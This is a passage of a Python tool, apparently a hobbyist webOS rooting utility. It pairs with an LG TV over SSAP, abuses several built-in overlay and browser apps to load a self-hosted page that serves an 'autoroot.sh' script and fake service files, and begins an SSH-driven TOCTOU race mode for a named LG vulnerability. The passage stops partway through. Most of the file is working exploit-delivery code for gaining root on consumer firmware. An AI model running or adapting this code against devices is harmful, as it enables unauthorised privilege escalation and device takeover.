#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# SlopBro
# by throwaway96
# https://github.com/throwaway96/slopbro
# Copyright 2026. Licensed under AGPL v3 or later. No warranties.

"""
slopbro.py - Connect to an LG webOS TV over SSAP, pair, and
launch various apps with a self-hosted payload page.

Standard library only. Requires Python 3.8 or newer and should be run on
a PC on the same LAN as the TV. Keep the accompanying wwwroot directory.

Example:
    python3 slopbro.py 192.168.1.50
    python3 slopbro.py --debug 192.168.1.50
    python3 slopbro.py --local-ip 1.2.3.4 192.168.1.50
"""

import argparse
import base64
import io
import json
import os
import posixpath
import socket
import ssl
import subprocess
import shlex
import secrets
import struct
import sys
import threading
import time
from hashlib import sha1
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import unquote, urlsplit, urlencode

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

PORT_TLS = 3001
PORT_PLAIN = 3000

# TODO: Support complete webOS version numbers (or firmware versions?).
# TODO: Figure out actual webOS version ranges for each app.
TARGET_APPS = [
    ("com.webos.app.voiceweb", "URL", [11]),
    (
        "com.webos.app.adoverlayex",
        "interactiveUrl",
        [3, 4, 5, 6, 7, 8, 9, 10],
    ),
    # TODO: Figure out why this doesn't always work on webOS 6.5.3.
    ("com.webos.app.adoverlay", "interactiveUrl", [3, 4, 5, 6, 7, 8, 9, 10]),
    ("com.webos.app.acroverlay", "contentTarget", [3, 4, 5, 6, 7, 8, 9, 10]),
    ("com.webos.app.tinybrowser", "contentTarget", [3, 4, 5, 6, 7, 8, 9, 10]),
    # May not work on certain webOS versions (e.g., 6.5.x) even if present
    # because of region restrictions.
    ("com.webos.app.dangbei-overlay", "target", [3, 4, 6, 7, 8, 9, 10]),
]

ENTRY_PAGE = "index.html"
SHELL_SCRIPT = "autoroot.sh"
SERVICE_FILES = [
    "package.json",
    "main.js",
]

ASSET_SOURCE_AUTO = "auto"
ASSET_SOURCE_DIR = "dir"
ASSET_SOURCE_EMBEDDED = "embedded"
ASSET_SOURCES = (ASSET_SOURCE_AUTO, ASSET_SOURCE_DIR, ASSET_SOURCE_EMBEDDED)

TEST_SERVER_SIMPLE = "simple"
TEST_SERVER_PAYLOAD = "payload"
TEST_SERVER_MODES = (TEST_SERVER_SIMPLE, TEST_SERVER_PAYLOAD)

# Should exist on all targeted webOS versions.
DEFAULT_FAKE_SERVICE_PATH = "/usr/palm/services/com.palm.service.devmode"

# This directory edition ships with no embedded assets. The upstream packaging
# markers remain for original-mode compatibility; race mode always uses wwwroot.
# --- BEGIN EMBEDDED WWWROOT ---
EMBEDDED_WWWROOT = {}
# --- END EMBEDDED WWWROOT ---

# seconds
CONNECT_TIMEOUT = 10.0
PAIR_TIMEOUT = 60.0

# Manifest distilled from the reference clients. Broad permission set so the
# launcher works across firmware versions; the TV grants what it recognizes.
DEFAULT_MANIFEST = {
    "manifestVersion": 1,
    "appVersion": "1.0",
    "appId": "lol.slopbro",
    "vendorId": "throwaway96",
    "localizedAppNames": {"": "SlopBro"},
    "localizedVendorNames": {"": "throwaway96"},
    "permissions": [
        "LAUNCH",
        "CLOSE",
        "READ_APP_STATUS",
        "READ_INSTALLED_APPS",
        "READ_RUNNING_APPS",
    ],
}


def log(msg):
    """Print a timestamped status line to stderr so stdout stays parse-friendly."""
    sys.stderr.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), msg))
    sys.stderr.flush()


def die(msg, code=1):
    log("error: " + msg)
    sys.exit(code)


# ---------------------------------------------------------------------------
# Minimal RFC 6455 WebSocket client (text frames only, client-side masking).
# ---------------------------------------------------------------------------


class WebSocketError(Exception):
    pass


class WebSocket:
    """A tiny blocking WebSocket client over a raw (optionally TLS) socket.

    Only what SSAP needs: a client handshake with no Origin header, masked text
    frames, ping/pong handling, and a clean close. Not a general-purpose library.
    """

    OP_TEXT = 0x1
    OP_CLOSE = 0x8
    OP_PING = 0x9
    OP_PONG = 0xA

    def __init__(self, sock):
        self._sock = sock
        self._recv_buf = b""
        self.closed = False

    @classmethod
    def connect(cls, host, port, secure=True, timeout=CONNECT_TIMEOUT):
        raw = socket.create_connection((host, port), timeout)
        if secure:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            # Intentional: the TV uses a self-signed certificate.
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(raw, server_hostname=host)
        else:
            sock = raw
        ws = cls(sock)
        ws._handshake(host, port, secure)
        return ws

    def _handshake(self, host, port, secure):
        key = base64.b64encode(os.urandom(16)).decode("ascii")
        # Deliberately no Origin header: that is what lets a native client past
        # the SSAP server's web-origin filter.
        lines = [
            "GET / HTTP/1.1",
            "Host: %s:%d" % (host, port),
            "Upgrade: websocket",
            "Connection: Upgrade",
            "Sec-WebSocket-Key: %s" % key,
            "Sec-WebSocket-Version: 13",
            "",
            "",
        ]
        self._sock.sendall("\r\n".join(lines).encode("ascii"))

        header = self._read_http_headers()
        status_line = header.split("\r\n", 1)[0]
        parts = status_line.split(" ", 2)
        if len(parts) < 2 or parts[1] != "101":
            raise WebSocketError("unexpected handshake response: %s" % status_line)

        expected = base64.b64encode(
            sha1((key + WS_GUID).encode("ascii")).digest()
        ).decode("ascii")
        accept = None
        for line in header.split("\r\n")[1:]:
            if ":" in line:
                name, value = line.split(":", 1)
                if name.strip().lower() == "sec-websocket-accept":
                    accept = value.strip()
                    break
        if accept != expected:
            raise WebSocketError("invalid Sec-WebSocket-Accept value")

    def _read_http_headers(self):
        while b"\r\n\r\n" not in self._recv_buf:
            chunk = self._sock.recv(4096)
            if not chunk:
                raise WebSocketError("connection closed during handshake")
            self._recv_buf += chunk
        header_bytes, self._recv_buf = self._recv_buf.split(b"\r\n\r\n", 1)
        return header_bytes.decode("latin-1")

    def _recv_exact(self, n):
        while len(self._recv_buf) < n:
            chunk = self._sock.recv(max(4096, n - len(self._recv_buf)))
            if not chunk:
                raise WebSocketError("connection closed")
            self._recv_buf += chunk
        data, self._recv_buf = self._recv_buf[:n], self._recv_buf[n:]
        return data

    def send_text(self, text):
        self._send_frame(self.OP_TEXT, text.encode("utf-8"))

    def _send_frame(self, opcode, payload):
        if self.closed:
            raise WebSocketError("socket is closed")
        header = bytearray()
        header.append(0x80 | opcode)  # FIN + opcode
        length = len(payload)
        mask_bit = 0x80  # client frames must be masked
        if length < 126:
            header.append(mask_bit | length)
        elif length < 65536:
            header.append(mask_bit | 126)
            header += struct.pack("!H", length)
        else:
            header.append(mask_bit | 127)
            header += struct.pack("!Q", length)
        mask = os.urandom(4)
        header += mask
        masked = bytearray(payload)
        for i in range(len(masked)):
            masked[i] ^= mask[i % 4]
        self._sock.sendall(bytes(header) + bytes(masked))

    def recv_text(self, timeout=None):
        """Return the next text-frame payload as a unicode string.

        Transparently answers pings. Returns
        None if the peer sends a close frame.
        """
        if timeout is not None:
            self._sock.settimeout(timeout)
        while True:
            fin, opcode, payload = self._read_frame()
            if opcode == self.OP_TEXT:
                return payload.decode("utf-8")
            elif opcode == self.OP_PING:
                self._send_frame(self.OP_PONG, payload)
                continue
            elif opcode == self.OP_PONG:
                continue
            elif opcode == self.OP_CLOSE:
                self._send_close()
                self.closed = True
                return None
            # Ignore unexpected non-text frames.
            if not fin:
                continue

    def _read_frame(self):
        b0, b1 = struct.unpack("!BB", self._recv_exact(2))
        fin = bool(b0 & 0x80)
        opcode = b0 & 0x0F
        masked = bool(b1 & 0x80)
        length = b1 & 0x7F
        if length == 126:
            length = struct.unpack("!H", self._recv_exact(2))[0]
        elif length == 127:
            length = struct.unpack("!Q", self._recv_exact(8))[0]
        mask = self._recv_exact(4) if masked else None
        payload = self._recv_exact(length) if length else b""
        if mask:
            payload = bytearray(payload)
            for i in range(len(payload)):
                payload[i] ^= mask[i % 4]
            payload = bytes(payload)
        return fin, opcode, payload

    def _send_close(self):
        try:
            self._send_frame(self.OP_CLOSE, b"")
        except (WebSocketError, OSError):
            pass

    def close(self):
        if not self.closed:
            self._send_close()
            self.closed = True
        try:
            self._sock.close()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# SSAP client layer
# ---------------------------------------------------------------------------


class SSAPError(Exception):
    pass


class SSAPClient:
    def __init__(self, ws):
        self._ws = ws
        self._counter = 0

    def _next_id(self, prefix):
        self._counter += 1
        return "%s_%d" % (prefix, self._counter)

    def _send(self, message):
        self._ws.send_text(json.dumps(message))

    def register(self, client_key, manifest, timeout=PAIR_TIMEOUT):
        """Perform the SSAP register handshake.

        Returns the client-key string from the 'registered' reply. If no key was
        stored, the TV shows a pairing prompt and this blocks (up to timeout)
        until the user accepts.
        """
        payload = {
            "forcePairing": False,
            "pairingType": "PROMPT",
            "manifest": manifest,
        }
        if client_key:
            payload["client-key"] = client_key
        msg_id = self._next_id("register")
        self._send({"id": msg_id, "type": "register", "payload": payload})

        prompted = False
        deadline = time.time() + timeout
        while True:
            remaining = deadline - time.time()
            if remaining <= 0:
                raise SSAPError("timed out waiting for registration")
            try:
                raw = self._ws.recv_text(timeout=remaining)
            except socket.timeout:
                raise SSAPError("timed out waiting for registration")
            if raw is None:
                raise SSAPError("connection closed during registration")
            msg = json.loads(raw)
            mtype = msg.get("type")
            if mtype == "registered":
                return (msg.get("payload") or {}).get("client-key", client_key)
            if mtype == "response" and (msg.get("payload") or {}).get("pairingType"):
                if not prompted:
                    prompted = True
                    log("accept the pairing prompt on the TV screen ...")
                continue
            if mtype == "error":
                raise SSAPError(msg.get("error") or "registration rejected")
            # Ignore anything else (e.g. stray notifications) and keep waiting.

    def request(self, uri, payload=None, timeout=15.0):
        """Send an SSAP request and return the matching response message."""
        msg_id = self._next_id("req")
        self._send(
            {
                "id": msg_id,
                "type": "request",
                "uri": uri,
                "payload": payload or {},
            }
        )
        deadline = time.time() + timeout
        while True:
            remaining = deadline - time.time()
            if remaining <= 0:
                raise SSAPError("timed out waiting for response to %s" % uri)
            try:
                raw = self._ws.recv_text(timeout=remaining)
            except socket.timeout:
                raise SSAPError("timed out waiting for response to %s" % uri)
            if raw is None:
                raise SSAPError("connection closed while awaiting %s" % uri)
            msg = json.loads(raw)
            if msg.get("id") == msg_id:
                return msg
            # Different id: not ours, keep reading.

    def close(self):
        self._ws.close()


# ---------------------------------------------------------------------------
# Client-key persistence
# ---------------------------------------------------------------------------


def key_path(ip):
    return os.path.join(os.getcwd(), "%s.key" % ip)


def load_client_key(ip):
    path = key_path(ip)
    try:
        with open(path, "r") as fh:
            return fh.read().strip()
    except OSError:
        return ""


def save_client_key(ip, client_key):
    path = key_path(ip)
    directory = os.path.dirname(path)
    if directory:
        try:
            os.makedirs(directory, exist_ok=True)
        except OSError:
            pass
    try:
        with open(path, "w") as fh:
            fh.write(client_key)
        try:
            os.chmod(path, 0o600)
        except OSError:
            pass
    except OSError as exc:
        log("warning: could not save client key to %s (%s)" % (path, exc))


# ---------------------------------------------------------------------------
# High-level flow
# ---------------------------------------------------------------------------


def target_apps_for_webos_version(candidates, webos_version):
    """Return launcher candidates compatible with the given webOS version."""
    if webos_version is None:
        return [(app_id, url_param_name) for app_id, url_param_name, _ in candidates]

    try:
        major_version = int(str(webos_version).split(".", 1)[0])
    except (TypeError, ValueError):
        raise ValueError("invalid webOS version: %s" % webos_version)

    return [
        (app_id, url_param_name)
        for app_id, url_param_name, major_versions in candidates
        if major_version in major_versions
    ]


def verify_app_present(client, candidates):
    """Check installed apps and return the first matching (app_id, url_param_name).

    Falls back to the first candidate if the check fails or no match is found.
    """
    fallback = candidates[0]
    try:
        resp = client.request(
            "ssap://com.webos.applicationManager/listApps", {}, timeout=8.0
        )
    except SSAPError as exc:
        log("warning: could not verify app presence (%s)" % exc)
        return fallback
    if resp.get("type") == "error":
        log(
            "warning: listApps denied (%s); skipping app check"
            % resp.get("error", "unknown")
        )
        return fallback
    apps = (resp.get("payload") or {}).get("apps") or []
    installed_ids = set(
        a.get("id") for a in apps if isinstance(a, dict) and a.get("id")
    )
    for app_id, url_param_name in candidates:
        if app_id in installed_ids:
            log("confirmed app is installed: %s" % app_id)
            return app_id, url_param_name
    log(
        "warning: none of [%s] found in listApps; launch may do nothing"
        % ", ".join(a for a, _ in candidates)
    )
    return fallback


def launch_app(client, app_id, params):
    resp = client.request(
        "ssap://system.launcher/launch", {"id": app_id, "params": params}
    )
    if resp.get("type") == "error":
        raise SSAPError("launch failed: %s" % resp.get("error", "unknown"))
    return resp.get("payload") or {}


def get_webos_version(client):
    """Query the TV's webOS version over SSAP and return it as a string.

    Uses 'major_ver'/'minor_ver' from getCurrentSWInformation to build a
    "<major>.<minor>" version string. Returns None if the query fails or
    the response doesn't contain usable version fields.

    TODO: use the detected version to choose which target app(s) to try.
    """
    try:
        resp = client.request(
            "ssap://com.webos.service.update/getCurrentSWInformation",
            {},
            timeout=8.0,
        )
    except SSAPError as exc:
        log("warning: could not query webOS version (%s)" % exc)
        return None
    if resp.get("type") == "error":
        log(
            "warning: getCurrentSWInformation denied (%s)"
            % resp.get("error", "unknown")
        )
        return None
    payload = resp.get("payload") or {}
    major_ver = payload.get("major_ver")
    minor_ver = payload.get("minor_ver")
    if major_ver and minor_ver:
        return "%s.%s" % (major_ver, minor_ver)
    if major_ver:
        return str(major_ver)
    log("warning: getCurrentSWInformation response missing version fields")
    return None


def local_ip_for_remote(remote_host, remote_port=80):
    """Choose a LAN-reachable local IPv4 for a given remote host."""
    remote_ip = socket.gethostbyname(remote_host)
    route_ip = _route_selected_local_ip(remote_ip, remote_port)

    # LunaDownloadMgr seems to choke on 127.0.0.1
    if route_ip and route_ip.startswith("127."):
        # Arbitrary external address; doesn't have to be reachable
        lan_ip = _route_selected_local_ip("8.8.8.8", 80)
        if lan_ip and not lan_ip.startswith("127."):
            log("detected loopback route; using LAN IP %s instead" % lan_ip)
            return lan_ip

    if route_ip:
        return route_ip
    raise RuntimeError("could not determine local IPv4 address")


def guess_local_ip(target_host=None, local_ip_override=None):
    """Resolve the local IPv4 to advertise, without necessarily knowing a target.

    Prefers an explicit override, then a route lookup toward target_host (if
    given), then falls back to the route toward an arbitrary external address.
    """
    if local_ip_override:
        return local_ip_override
    if target_host:
        return local_ip_for_remote(target_host)
    # Arbitrary external address; doesn't have to be reachable
    route_ip = _route_selected_local_ip("8.8.8.8", 80)
    if route_ip:
        return route_ip
    raise RuntimeError("could not determine local IPv4 address")


def _route_selected_local_ip(remote_ip, remote_port):
    """Ask the kernel route table which source IP it would pick."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        try:
            sock.connect((remote_ip, remote_port))
            return sock.getsockname()[0]
        except OSError:
            return None


def required_files():
    return [ENTRY_PAGE, SHELL_SCRIPT] + list(SERVICE_FILES)


def resolve_wwwroot_path():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    root_dir = os.path.join(script_dir, "wwwroot")
    return root_dir


def _embedded_meta_for(rel_path):
    if not isinstance(EMBEDDED_WWWROOT, dict):
        return None
    meta = EMBEDDED_WWWROOT.get(rel_path)
    if not isinstance(meta, dict):
        return None
    return meta


def _read_embedded_file(rel_path):
    meta = _embedded_meta_for(rel_path)
    if meta is None:
        return None
    encoding = meta.get("encoding", "base64")
    if encoding != "base64":
        raise RuntimeError(
            "unsupported embedded encoding for %s: %s" % (rel_path, encoding)
        )
    payload = meta.get("data", "")
    return base64.b64decode(payload)


def _read_filesystem_file(root_dir, rel_path):
    if not root_dir:
        return None
    abs_path = os.path.join(root_dir, rel_path.replace("/", os.sep))
    if not os.path.isfile(abs_path):
        return None
    with open(abs_path, "rb") as fh:
        return fh.read()


def _missing_required_files(
    tracked_files,
    root_dir,
    allow_embedded_assets,
    allow_filesystem_fallback,
):
    missing = []
    for rel_path in tracked_files:
        if allow_embedded_assets and _embedded_meta_for(rel_path) is not None:
            continue
        if (
            allow_filesystem_fallback
            and _read_filesystem_file(root_dir, rel_path) is not None
        ):
            continue
        missing.append(rel_path)
    return missing


def resolve_asset_root(asset_source, tracked_files):
    dir_root = resolve_wwwroot_path()
    if asset_source not in ASSET_SOURCES:
        raise RuntimeError(
            "invalid --asset-source '%s' (expected one of: %s)"
            % (asset_source, ", ".join(ASSET_SOURCES))
        )

    allow_embedded_assets = asset_source != ASSET_SOURCE_DIR
    allow_filesystem_fallback = asset_source != ASSET_SOURCE_EMBEDDED
    if allow_filesystem_fallback and not os.path.isdir(dir_root):
        dir_root = None

    missing = _missing_required_files(
        tracked_files,
        dir_root,
        allow_embedded_assets,
        allow_filesystem_fallback,
    )
    if missing:
        raise RuntimeError(
            "required files not found in %s: %s"
            % (
                (
                    "wwwroot"
                    if asset_source == ASSET_SOURCE_DIR
                    else (
                        "embedded data"
                        if asset_source == ASSET_SOURCE_EMBEDDED
                        else "embedded data or wwwroot"
                    )
                ),
                ", ".join(missing),
            )
        )

    if asset_source == ASSET_SOURCE_DIR:
        source_desc = ASSET_SOURCE_DIR
    elif allow_filesystem_fallback and dir_root is not None:
        source_desc = "embedded+dir"
    elif allow_filesystem_fallback:
        source_desc = "embedded"
    else:
        source_desc = ASSET_SOURCE_EMBEDDED
    return dir_root, source_desc, allow_embedded_assets, allow_filesystem_fallback


class RequestedFilesTracker:
    def __init__(self, tracked_files):
        self._tracked = set(tracked_files)
        self._seen = set()
        self._lock = threading.Lock()
        self._complete = threading.Event()
        if not self._tracked:
            self._complete.set()

    def mark_seen(self, rel_path):
        with self._lock:
            if rel_path not in self._tracked or rel_path in self._seen:
                return False, len(self._seen), len(self._tracked)
            self._seen.add(rel_path)
            if self._seen == self._tracked:
                self._complete.set()
            return True, len(self._seen), len(self._tracked)

    def wait_for_all(self, timeout):
        return self._complete.wait(timeout)

    def missing_files(self):
        with self._lock:
            return sorted(self._tracked - self._seen)

    def total_files(self):
        with self._lock:
            return len(self._tracked)


def make_tracking_handler(
    root_dir,
    tracker,
    tracked_files,
    allow_embedded_assets,
    allow_filesystem_fallback,
):
    tracked = set(tracked_files)

    class TrackingHTTPRequestHandler(SimpleHTTPRequestHandler):
        def _requested_rel_path(self):
            raw_path = urlsplit(self.path).path
            raw_path = unquote(raw_path, errors="surrogatepass")
            raw_path = posixpath.normpath(raw_path)
            if raw_path in ("", "/", "."):
                return ENTRY_PAGE
            rel_path = raw_path.lstrip("/")
            if rel_path.startswith("../") or rel_path == "..":
                return None
            return rel_path.replace("\\", "/")

        def _send_bytes(self, rel_path, data):
            ctype = self.guess_type(rel_path)
            self.send_response(200)
            self.send_header("Content-type", ctype)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            return io.BytesIO(data)

        def _mark_served_file(self, rel_path):
            marked, seen_count, total_count = tracker.mark_seen(rel_path)
            if marked:
                log(
                    "served required file: %s (%d/%d)"
                    % (
                        rel_path,
                        seen_count,
                        total_count,
                    )
                )

        def send_head(self):
            rel_path = self._requested_rel_path()
            if rel_path is None or rel_path not in tracked:
                self.send_error(404, "File not found")
                return None

            data = None
            if allow_embedded_assets:
                data = _read_embedded_file(rel_path)
            if data is None and allow_filesystem_fallback:
                data = _read_filesystem_file(root_dir, rel_path)
            if data is None:
                self.send_error(404, "File not found")
                return None

            return self._send_bytes(rel_path, data)

        def do_GET(self):
            """Serve a GET and track it only after the body has been copied."""
            rel_path = self._requested_rel_path()
            f = self.send_head()
            if f:
                with f:
                    self.copyfile(f, self.wfile)
                self._mark_served_file(rel_path)

    return TrackingHTTPRequestHandler


def start_http_server(
    root_dir,
    tracker,
    tracked_files,
    allow_embedded_assets,
    allow_filesystem_fallback,
    bind_host="0.0.0.0",
    preferred_port=8080,
):
    """Start a tiny static file server rooted at root_dir."""
    handler = make_tracking_handler(
        root_dir,
        tracker,
        tracked_files,
        allow_embedded_assets,
        allow_filesystem_fallback,
    )
    return _start_http_server(handler, bind_host, preferred_port)


def _start_http_server(handler, bind_host, preferred_port):
    server = None
    for port in (preferred_port, 0):
        try:
            server = HTTPServer((bind_host, port), handler)
            break
        except OSError:
            server = None
    if server is None:
        raise RuntimeError("could not start local HTTP server")

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def build_self_hosted_url(
    tv_host,
    server_port,
    debug=False,
    local_ip_override=None,
    curl_insecure=False,
    fake_service_path=DEFAULT_FAKE_SERVICE_PATH,
):
    local_ip = local_ip_override or local_ip_for_remote(tv_host)
    url = "http://%s:%d/%s" % (local_ip, server_port, ENTRY_PAGE)
    url += "?script=%s&files=%s" % (SHELL_SCRIPT, ";".join(SERVICE_FILES))
    if debug:
        url += "&debug"
    if curl_insecure:
        url += "&curl-insecure"
    if fake_service_path:
        url += "&fake-service-path=%s" % fake_service_path
    return url


def _validate_ipv4_address(ip_text):
    try:
        socket.inet_aton(ip_text)
    except OSError:
        return False
    return ip_text.count(".") == 3


TEST_CONNECTION_MESSAGE = "Here's your slop, bro!\n"


def make_test_connection_handler():
    """Build a minimal request handler that answers every request the same way.

    Used only to prove that the TV (or any browser on the LAN) can reach this
    host over HTTP; it doesn't serve any real payload/exploit files.
    """
    body = TEST_CONNECTION_MESSAGE.encode("utf-8")

    class TestConnectionHandler(BaseHTTPRequestHandler):
        def _send_headers(self, include_body):
            self.send_response(200)
            self.send_header("Content-type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            if include_body:
                self.wfile.write(body)

        def do_GET(self):
            self._send_headers(True)

        def do_HEAD(self):
            self._send_headers(False)

        def log_message(self, format, *args):
            log("request from %s: %s" % (self.client_address[0], format % args))

    return TestConnectionHandler


def start_test_connection_server(bind_host="0.0.0.0", preferred_port=8080):
    handler = make_test_connection_handler()
    return _start_http_server(handler, bind_host, preferred_port)


def run_test_connection(host=None, local_ip_override=None):
    """Serve a fixed plain-text response to test basic HTTP connectivity only.

    Doesn't serve the real payload/exploit files and doesn't perform any SSAP
    pairing; just prints the URL to open manually in the TV's (or any) web
    browser to confirm that the TV can reach this host over HTTP. host is
    optional here since no SSAP connection or route-to-TV lookup is required.
    """
    if not host:
        log(
            "warning: no <tv-ip-or-host> given; the guessed local IP may be "
            "wrong (recommended: pass the TV's IP address)"
        )

    http_server = None
    url = None
    try:
        http_server = start_test_connection_server()
        local_ip = guess_local_ip(
            target_host=host, local_ip_override=local_ip_override
        )
        url = "http://%s:%d/" % (local_ip, http_server.server_port)
    except Exception as exc:
        die("could not start test HTTP server: %s" % exc)

    log("test mode: minimal HTTP connectivity check (no payload served)")
    log("open this URL in the TV's web browser to test HTTP connectivity:")
    log("    %s" % url)
    log("press Ctrl+C to stop")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("stopping test server")
    finally:
        if http_server is not None:
            try:
                http_server.shutdown()
            except Exception:
                pass
            try:
                http_server.server_close()
            except Exception:
                pass


def run_test_payload(
    host=None,
    debug=False,
    asset_source=ASSET_SOURCE_AUTO,
    local_ip_override=None,
    curl_insecure=False,
    fake_service_path=DEFAULT_FAKE_SERVICE_PATH,
):
    """Serve the payload page and print its URL without pairing/launching.

    Lets the user manually open the URL in the TV's web browser (or any
    browser on the LAN) to confirm that the payload/exploit files are served
    correctly, without needing a working SSAP connection first. host is
    recommended, since it's used to guess the local IP to listen on.
    """
    if not host:
        log(
            "warning: no <tv-ip-or-host> given; the guessed local IP may be "
            "wrong (recommended: pass the TV's IP address)"
        )

    tracked_files = required_files()
    wwwroot_dir = None
    asset_source_used = None
    allow_embedded_assets = True
    allow_filesystem_fallback = True
    http_server = None
    page_url = None
    try:
        (
            wwwroot_dir,
            asset_source_used,
            allow_embedded_assets,
            allow_filesystem_fallback,
        ) = resolve_asset_root(asset_source, tracked_files)
    except RuntimeError as exc:
        die("%s" % exc)

    tracker = RequestedFilesTracker(tracked_files)
    try:
        http_server = start_http_server(
            wwwroot_dir,
            tracker,
            tracked_files,
            allow_embedded_assets,
            allow_filesystem_fallback,
        )
        local_ip = guess_local_ip(
            target_host=host, local_ip_override=local_ip_override
        )
        page_url = build_self_hosted_url(
            host,
            http_server.server_port,
            debug=debug,
            curl_insecure=curl_insecure,
            local_ip_override=local_ip,
            fake_service_path=fake_service_path,
        )
    except Exception as exc:
        die("could not start self-hosted page server: %s" % exc)

    log(
        "test mode: serving files from %s (source=%s)"
        % (wwwroot_dir, asset_source_used)
    )
    log("open this URL in the TV's web browser to test the payload:")
    log("    %s" % page_url)
    log("press Ctrl+C to stop")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("stopping test server")
    finally:
        if http_server is not None:
            try:
                http_server.shutdown()
            except Exception:
                pass
            try:
                http_server.server_close()
            except Exception:
                pass


def run(
    host,
    debug=False,
    asset_source=ASSET_SOURCE_AUTO,
    local_ip_override=None,
    webos_version_override=None,
    curl_insecure=False,
    fake_service_path=DEFAULT_FAKE_SERVICE_PATH,
):
    secure = True
    port = PORT_TLS if secure else PORT_PLAIN
    scheme = "wss" if secure else "ws"
    log("connecting to %s://%s:%d" % (scheme, host, port))

    tracked_files = required_files()
    wwwroot_dir = None
    asset_source_used = None
    allow_embedded_assets = True
    allow_filesystem_fallback = True
    http_server = None
    page_url = None
    ws = None
    new_key = ""
    result = {}
    try:
        (
            wwwroot_dir,
            asset_source_used,
            allow_embedded_assets,
            allow_filesystem_fallback,
        ) = resolve_asset_root(
            asset_source,
            tracked_files,
        )
    except RuntimeError as exc:
        die("%s" % exc)

    tracker = RequestedFilesTracker(tracked_files)
    if tracked_files:
        log(
            "tracking %d files in %s (source=%s)"
            % (len(tracked_files), wwwroot_dir, asset_source_used)
        )
    else:
        log("warning: no files found in %s" % wwwroot_dir)
    try:
        http_server = start_http_server(
            wwwroot_dir,
            tracker,
            tracked_files,
            allow_embedded_assets,
            allow_filesystem_fallback,
        )
        page_url = build_self_hosted_url(
            host,
            http_server.server_port,
            debug=debug,
            curl_insecure=curl_insecure,
            local_ip_override=local_ip_override,
            fake_service_path=fake_service_path,
        )
    except Exception as exc:
        die("could not start self-hosted page server: %s" % exc)
    log("serving files from %s at %s" % (wwwroot_dir, page_url))

    try:
        ws = WebSocket.connect(
            host,
            port,
            secure=secure,
        )
    except (OSError, WebSocketError) as exc:
        die("could not connect to TV: %s" % exc)

    client = SSAPClient(ws)
    try:
        stored_key = load_client_key(host)
        if stored_key:
            log("using stored client key")
        else:
            log("no stored client key; pairing will be requested")

        try:
            new_key = client.register(stored_key, DEFAULT_MANIFEST)
        except SSAPError as exc:
            die("registration failed: %s" % exc)

        if new_key and new_key != stored_key:
            save_client_key(host, new_key)
            log("registered; client key saved")
        else:
            log("registered")

        webos_version = None
        if webos_version_override:
            webos_version = webos_version_override
            log("using forced webOS version: %s" % webos_version)
        elif False:
            # TODO: Fix and re-enable.
            webos_version = get_webos_version(client)
            if webos_version:
                log("detected webOS version: %s" % webos_version)

        target_apps = []
        try:
            target_apps = target_apps_for_webos_version(TARGET_APPS, webos_version)
        except ValueError as exc:
            die("%s" % exc)
        if not target_apps:
            die("no target apps configured for webOS %s" % webos_version)
        app_id, url_param_name = verify_app_present(client, target_apps)

        log("launching %s -> %s" % (app_id, page_url))
        try:
            result = launch_app(client, app_id, {url_param_name: page_url})
        except SSAPError as exc:
            die("%s" % exc)

        print(json.dumps(result, sort_keys=True))

        log("waiting for all tracked files to be requested")
        tracker.wait_for_all(None)
        log("done; all tracked files were requested (❛ ᴗ ❛)")
    finally:
        client.close()
        if http_server is not None:
            try:
                http_server.shutdown()
            except Exception:
                pass
            try:
                http_server.server_close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# LGPSVE-2445 TOCTOU race mode (SSH-assisted, no helper IPK required).
# ---------------------------------------------------------------------------

RACE_ENTRY_PAGE = "race.html"
RACE_DEFAULT_TRUSTED = "/usr/palm/services/com.palm.service.devmode"


class RaceError(Exception):
    pass


def _shq(value):
    return shlex.quote(str(value))


class SSHRunner:
    def __init__(self, host, user="prisoner", port=9922, key=None, options=None):
        self.destination = "%s@%s" % (user, host)
        self.args = [
            "ssh", "-p", str(port),
            "-o", "BatchMode=yes",
            "-o", "ConnectTimeout=10",
        ]
        if key:
            self.args += ["-i", os.path.abspath(os.path.expanduser(key))]
        for option in options or []:
            self.args += ["-o", option]

    def run(self, command, stdin=None, timeout=40, check=True):
        try:
            proc = subprocess.run(
                self.args + [self.destination, command],
                input=stdin,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
            )
        except FileNotFoundError:
            raise RaceError("system ssh client was not found")
        except subprocess.TimeoutExpired:
            raise RaceError("SSH command timed out: %s" % command)
        if check and proc.returncode != 0:
            raise RaceError(
                "SSH command failed (%d): %s\nstdout: %s\nstderr: %s"
                % (
                    proc.returncode,
                    command,
                    proc.stdout.decode("utf-8", "replace")[-2000:],
                    proc.stderr.decode("utf-8", "replace")[-2000:],
                )
            )
        return proc

    def put(self, path, data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        self.run("cat > %s" % _shq(path), stdin=data)

    def exists(self, path):
        proc = self.run("[ -e %s ]" % _shq(path), check=False)
        return proc.returncode == 0

    def read(self, path, limit=12000):
        proc = self.run(
            "tail -c %d %s" % (int(limit), _shq(path)), check=False
        )
        return proc.stdout.decode("utf-8", "replace")

    def pid_alive(self, pid_path):
        proc = self.run(
            "test -f %s && kill -0 $(cat %s) 2>/dev/null"
            % (_shq(pid_path), _shq(pid_path)),
            check=False,
        )
        return proc.returncode == 0


class RaceState:
    def __init__(self):
        self._lock = threading.Lock()
        self.root = False
        self.stop = False
        self.final = None
        self.progress = None

    def status(self):
        with self._lock:
            return {"root": self.root, "stop": self.stop}

    def request_stop(self, root=False):
        with self._lock:
            self.stop = True
            if root:
                self.root = True

    def report(self, report):
        with self._lock:
            self.progress = report
            if report.get("final"):
                self.final = report


def make_race_http_handler(state):
    class RaceHandler(BaseHTTPRequestHandler):
